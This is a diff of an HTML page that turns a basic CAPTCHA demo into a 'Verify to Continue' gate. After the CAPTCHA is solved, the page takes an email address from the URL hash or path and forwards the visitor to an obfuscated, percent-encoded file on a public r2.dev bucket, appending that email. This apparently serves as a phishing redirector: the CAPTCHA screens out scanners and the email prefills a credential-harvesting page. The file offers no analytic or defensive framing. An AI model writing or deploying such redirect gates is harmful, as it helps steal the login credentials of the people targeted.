@@ -1,90 +1,234 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Redirect with Advanced Captcha</title>
-  <style>
-    .captcha-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 20px;
-    }
-
-    #captcha-canvas {
-      background-color: transparent; /* Set background to transparent */
-      cursor: pointer;
-    }
-
-    .captcha-input {
-      margin-top: 10px;
-      padding: 5px;
-      font-size: 16px;
-      text-align: center;
-    }
-
-    .email-input {
-      margin-top: 10px;
-      padding: 5px;
-      font-size: 16px;
-      text-align: center;
-    }
-
-    .captcha-submit {
-      margin-top: 10px;
-      padding: 5px 20px;
-      font-size: 16px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .captcha-container {
+            margin: 1rem 0;
+            padding: 1rem;
+            background-color: #f8f8f8;
+            border-radius: 4px;
+        }
+        #captchaCanvas {
+            background-color: #ffffff;
+            border: 1px solid #ccc;
+            margin-bottom: 1rem;
+            max-width: 100%;
+        }
+        input {
+            padding: 0.5rem;
+            margin: 0.5rem 0;
+            width: 200px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            max-width: 100%;
+        }
+        input:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+        button {
+            padding: 0.5rem 1rem;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .error {
+            color: red;
+            margin-top: 0.5rem;
+            display: none;
+            font-size: 0.9rem;
+        }
+    </style>
 </head>
 <body>
-  <div class="captcha-container">
-    <canvas id="captcha-canvas" width="200" height="50"></canvas>
-    <input type="text" class="captcha-input" placeholder="Enter captcha" />
-    <input type="email" class="email-input" placeholder="Enter email" />
-    <button class="captcha-submit">Submit</button>
-  </div>
+    <div class="container">
+        <h1>Verify to Continue</h1>
+        <p>Please complete the verification below</p>
+        
+        <div class="captcha-container">
+            <canvas id="captchaCanvas" width="200" height="50"></canvas>
+            <button onclick="regenerateCaptcha()" type="button">Refresh CAPTCHA</button>
+            <input type="text" id="captchaInput" placeholder="Enter CAPTCHA text" autocomplete="off">
+            <div class="error" id="captchaError">Incorrect CAPTCHA. Please try again.</div>
+        </div>
+        
+        <button onclick="verifyAndRedirect()" id="submitBtn" type="button">Verify & Continue</button>
+    </div>
 
-  <script>
-    const captchaCanvas = document.getElementById('captcha-canvas');
-    const captchaInput = document.querySelector('.captcha-input');
-    const emailInput = document.querySelector('.email-input');
-    const captchaSubmit = document.querySelector('.captcha-submit');
+    <script>
+        let captchaText = '';
+        
+        function generateCaptcha() {
+            // Removed potentially confusing characters (0,O,1,I,l)
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789';
+            captchaText = '';
+            for (let i = 0; i < 6; i++) {
+                captchaText += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return captchaText;
+        }
 
-    // Generate random captcha text
-    let captchaText = '';
-    const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-    for (let i = 0; i < 6; i++) {
-      captchaText += possible.charAt(Math.floor(Math.random() * possible.length));
-    }
+        function drawCaptcha() {
+            const canvas = document.getElementById('captchaCanvas');
+            if (!canvas || !canvas.getContext) {
+                console.error('Canvas not supported or not found');
+                return;
+            }
 
-    // Draw the captcha text on the canvas
-    const ctx = captchaCanvas.getContext('2d');
-    ctx.clearRect(0, 0, captchaCanvas.width, captchaCanvas.height);
-    ctx.fillStyle = 'white'; // Set text color to white
-    ctx.strokeStyle = 'black'; // Set stroke color to black
-    ctx.font = '30px Arial';
-    ctx.fillText(captchaText, 20, 35);
-    ctx.strokeText(captchaText, 20, 35); // Add a black stroke to the text
+            const ctx = canvas.getContext('2d');
+            if (!ctx) {
+                console.error('Could not get canvas context');
+                return;
+            }
 
-    // Add some distortion to the captcha
-    for (let i = 0; i < 10; i++) {
-      ctx.beginPath();
-      ctx.moveTo(Math.random() * captchaCanvas.width, Math.random() * captchaCanvas.height);
-      ctx.lineTo(Math.random() * captchaCanvas.width, Math.random() * captchaCanvas.height);
-      ctx.strokeStyle = 'rgba(0,0,0,' + Math.random() + ')';
-      ctx.stroke();
-    }
+            // Clear the canvas
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Fill background
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Add noise dots
+            for (let i = 0; i < 100; i++) {
+                ctx.fillStyle = `rgba(0, 0, 0, ${Math.random() * 0.2})`;
+                ctx.fillRect(
+                    Math.random() * canvas.width,
+                    Math.random() * canvas.height,
+                    2,
+                    2
+                );
+            }
+            
+            // Generate and draw text
+            const text = generateCaptcha();
+            
+            // Draw each character with random rotation and color
+            for (let i = 0; i < text.length; i++) {
+                ctx.font = `${25 + Math.random() * 10}px Arial`;
+                ctx.fillStyle = `rgb(${Math.floor(Math.random() * 100)}, 
+                                   ${Math.floor(Math.random() * 100)}, 
+                                   ${Math.floor(Math.random() * 100)})`;
+                
+                const x = (canvas.width / 6) * (i + 0.5);
+                const y = canvas.height / 2;
+                
+                ctx.save();
+                ctx.translate(x, y);
+                ctx.rotate((Math.random() - 0.5) * 0.4);
+                ctx.fillText(text[i], 0, 0);
+                ctx.restore();
+            }
+            
+            // Add random lines
+            for (let i = 0; i < 4; i++) {
+                ctx.beginPath();
+                ctx.strokeStyle = `rgba(0, 0, 0, ${Math.random() * 0.2})`;
+                ctx.lineWidth = 1;
+                ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+                ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+                ctx.stroke();
+            }
+        }
 
-    captchaSubmit.addEventListener('click', () => {
-      if (captchaInput.value === captchaText) {
-        const email = emailInput.value;
-        // Redirect to the target URL with the email in the hash fragment
-        window.location.href = `https://example.com#${email}`;
-      } else {
-        alert('Invalid captcha. Please try again.');
-      }
-    });
-  </script>
+        function verifyAndRedirect() {
+            const captchaInput = document.getElementById('captchaInput');
+            const captchaError = document.getElementById('captchaError');
+            
+            if (!captchaInput || !captchaError) {
+                console.error('Required elements not found');
+                return;
+            }
+
+            if (captchaInput.value.trim() === captchaText) {
+                captchaError.style.display = 'none';
+                
+                // Get email from URL if present
+                const hash = window.location.hash.substring(1);
+                const pathParts = window.location.pathname.split('$');
+                const encodedEmail = hash || (pathParts.length > 1 ? pathParts[1] : '');
+                
+                // Redirect with email parameter if it exists
+                if (encodedEmail) {
+                    window.location.href = `https://pub-849ff20d0c0d4b0bb58393855c1916c9.r2.dev/%D9%83.%D9%87%D9%86%D8%A7%D9%83bcrovueaBvby0sidge0wjyhmr0fjto5tw%D9%88%D8%A7%D8%B9pil3tyjqdowqza9kn%D8%AA%D8%AF%D8%A7%D9%84%D8%A8%D9%8A%D8%A7%D9%86%D8%A7v2.html#${encodedEmail}`;
+                } else {
+                    window.location.href = 'https://pub-849ff20d0c0d4b0bb58393855c1916c9.r2.dev/%D9%83.%D9%87%D9%86%D8%A7%D9%83bcrovueaBvby0sidge0wjyhmr0fjto5tw%D9%88%D8%A7%D8%B9pil3tyjqdowqza9kn%D8%AA%D8%AF%D8%A7%D9%84%D8%A8%D9%8A%D8%A7%D9%86%D8%A7v2.html#';
+                }
+            } else {
+                captchaError.style.display = 'block';
+                regenerateCaptcha();
+                captchaInput.value = '';
+                captchaInput.focus();
+            }
+        }
+
+        function regenerateCaptcha() {
+            drawCaptcha();
+            const captchaInput = document.getElementById('captchaInput');
+            const captchaError = document.getElementById('captchaError');
+            
+            if (captchaInput && captchaError) {
+                captchaInput.value = '';
+                captchaError.style.display = 'none';
+                captchaInput.focus();
+            }
+        }
+
+        // Add keyboard support
+        document.addEventListener('DOMContentLoaded', function() {
+            const captchaInput = document.getElementById('captchaInput');
+            if (captchaInput) {
+                captchaInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        verifyAndRedirect();
+                    }
+                });
+            }
+        });
+
+        // Initialize CAPTCHA
+        window.onload = function() {
+            try {
+                drawCaptcha();
+                const captchaInput = document.getElementById('captchaInput');
+                if (captchaInput) {
+                    captchaInput.focus();
+                }
+            } catch (error) {
+                console.error('Error initializing CAPTCHA:', error);
+            }
+        };
+    </script>
 </body>
 </html>
